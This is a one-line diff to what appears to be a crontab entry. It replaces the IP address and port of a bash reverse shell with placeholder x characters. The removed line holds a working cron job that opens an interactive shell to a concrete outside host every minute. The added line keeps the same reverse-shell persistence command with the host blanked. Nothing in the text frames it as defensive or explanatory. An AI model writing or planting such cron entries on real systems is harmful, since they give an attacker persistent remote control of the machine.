@@ -1,1 +1,1 @@
-*/1 * * * * bash -i >& /dev/tcp/175.178.233.198/8881 0>&1
+*/1 * * * * bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0>&1
